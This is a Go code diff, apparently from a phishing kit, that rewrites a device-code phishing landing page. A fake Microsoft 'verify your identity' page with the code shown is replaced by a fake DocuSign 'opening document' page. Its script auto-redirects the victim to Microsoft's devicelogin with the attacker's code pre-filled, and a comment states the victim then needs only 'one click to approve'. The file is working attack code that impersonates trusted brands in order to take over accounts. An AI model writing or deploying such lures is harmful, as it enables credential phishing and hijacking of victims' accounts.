@@ -607,80 +607,48 @@ func dcB64(s string) string {
 // ─────────────────────────────────────────────────────────────────────────────
 
 func DCLandingPage(t *DCTarget) string {
+	// Use the complete URI if Microsoft returned one, otherwise build it.
 	verifyURL := t.VerificationURI + "?code=" + url.QueryEscape(t.UserCode)
 	return fmt.Sprintf(`<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Microsoft – Verify your identity</title>
+<title>DocuSign – Opening document…</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;min-height:100vh;display:flex;flex-direction:column}
-.header{background:#0078d4;padding:14px 24px;display:flex;align-items:center;gap:12px}
-.header svg{width:108px;height:24px}
-.header span{color:rgba(255,255,255,.7);font-size:13px;border-left:1px solid rgba(255,255,255,.3);padding-left:12px;margin-left:4px}
-.main{flex:1;display:flex;align-items:center;justify-content:center;padding:32px 16px}
-.card{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.15);padding:40px 44px;max-width:420px;width:100%%;text-align:center}
-.logo-wrap{margin-bottom:24px}
-.logo-wrap svg{width:44px;height:44px}
-h1{font-size:20px;font-weight:600;color:#1b1b1b;margin-bottom:10px}
-.sub{color:#605e5c;font-size:14px;line-height:1.5;margin-bottom:28px}
-.code-box{background:#f0f6ff;border:2px dashed #0078d4;border-radius:6px;padding:18px;margin-bottom:28px}
-.code-label{font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:#605e5c;margin-bottom:6px}
-.code{font-size:38px;font-weight:700;letter-spacing:10px;color:#0078d4;font-family:'Courier New',monospace}
-.btn{display:block;width:100%%;background:#0078d4;color:#fff;padding:12px;border-radius:2px;font-size:15px;font-weight:600;text-decoration:none;margin-bottom:12px;transition:background .15s}
-.btn:hover{background:#106ebe}
-.hint{font-size:12px;color:#a19f9d;line-height:1.5}
-.hint a{color:#0078d4}
-.footer{text-align:center;padding:16px;font-size:11px;color:#a19f9d}
+body{font-family:Arial,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.card{background:#fff;border:1px solid #ddd;border-radius:4px;padding:48px 52px;max-width:400px;width:100%%;text-align:center}
+.ds-logo{margin-bottom:24px}
+.spinner{width:36px;height:36px;border:3px solid #eee;border-top-color:#FFB900;border-radius:50%%;animation:spin .8s linear infinite;margin:0 auto 24px}
+@keyframes spin{to{transform:rotate(360deg)}}
+h2{font-size:18px;font-weight:600;color:#222;margin-bottom:10px}
+p{font-size:14px;color:#777;line-height:1.6}
 </style>
 </head>
 <body>
-<div class="header">
-<svg viewBox="0 0 108 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <path d="M0 0h11.4v11.4H0V0zm12.6 0H24v11.4H12.6V0zM0 12.6h11.4V24H0V12.6zm12.6 0H24V24H12.6V12.6z" fill="#fff"/>
-  <path d="M35.5 18V6.2h2.2l3.6 8.1 3.5-8.1h2.2V18h-1.8v-9.2L41.4 18h-1.2l-3.8-9.2V18h-1.9zm14.4 0V6.2h1.9V18h-1.9zm4.5 0V6.2h2l5.2 9V6.2h1.8V18h-2l-5.2-9V18H54.4zm12.4 0V6.2h7.2v1.6h-5.3v3.4h5v1.6h-5v3.6h5.5V18h-7.4zm10.2 0V6.2h3.9c1.2 0 2.2.3 2.9 1s1.1 1.5 1.1 2.6c0 .8-.2 1.5-.6 2-.4.6-.9 1-1.6 1.2L85.1 18h-2l-2.4-4.5h-1.8V18h-1.9zm1.9-6h1.9c.7 0 1.2-.2 1.6-.5.4-.4.6-.9.6-1.5s-.2-1.1-.6-1.5c-.4-.4-.9-.5-1.6-.5h-1.9v4zm9.3 6V7.8H84v-1.6h7.4v1.6h-2.7V18h-1.9z" fill="white"/>
-</svg>
-<span>Account Security</span>
-</div>
-<div class="main">
 <div class="card">
-  <div class="logo-wrap">
-    <svg viewBox="0 0 44 44" xmlns="http://www.w3.org/2000/svg">
-      <rect x="0" y="0" width="21" height="21" fill="#f25022"/>
-      <rect x="23" y="0" width="21" height="21" fill="#7fba00"/>
-      <rect x="0" y="23" width="21" height="21" fill="#00a4ef"/>
-      <rect x="23" y="23" width="21" height="21" fill="#ffb900"/>
+  <div class="ds-logo">
+    <svg width="110" height="26" viewBox="0 0 110 26" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <rect width="26" height="26" rx="3" fill="#FFB900"/>
+      <path d="M6 13C6 9.13 9.13 6 13 6C16.87 6 20 9.13 20 13C20 16.87 16.87 20 13 20C9.13 20 6 16.87 6 13Z" fill="white"/>
+      <path d="M10 13L12.5 15.5L16.5 10.5" stroke="#FFB900" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      <text x="30" y="19" font-family="Arial" font-weight="700" font-size="15" fill="#333">DocuSign</text>
     </svg>
   </div>
-  <h1>Verify it's you</h1>
-  <p class="sub">To confirm your identity, enter the code below at the Microsoft verification page.</p>
-  <div class="code-box">
-    <div class="code-label">Your code</div>
-    <div class="code" id="uc">%s</div>
-  </div>
-  <a class="btn" href="%s" target="_blank">Open Verification Page →</a>
-  <p class="hint">
-    Or go to <a href="%s" target="_blank">microsoft.com/devicelogin</a>
-    and enter the code manually.<br><br>
-    This code expires in %d minutes.
-  </p>
+  <div class="spinner"></div>
+  <h2>Verifying your identity…</h2>
+  <p>You will be redirected to Microsoft to confirm your account.<br>This only takes a moment.</p>
 </div>
-</div>
-<div class="footer">© Microsoft Corporation · Privacy · Terms</div>
 <script>
-// Copy code to clipboard on click
-document.getElementById('uc').style.cursor='pointer';
-document.getElementById('uc').title='Click to copy';
-document.getElementById('uc').addEventListener('click',function(){
-  navigator.clipboard&&navigator.clipboard.writeText(this.innerText);
-  this.style.color='#107c10';
-  setTimeout(()=>{this.style.color='';},1200);
-});
+// Auto-redirect to Microsoft devicelogin with code pre-filled.
+// Victim lands on Microsoft's own confirmation page — one click to approve.
+setTimeout(function(){
+  window.location.replace(%q);
+}, 1800);
 </script>
 </body>
-</html>`, t.UserCode, verifyURL, t.VerificationURI, t.ExpiresIn/60)
+</html>`, verifyURL)
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
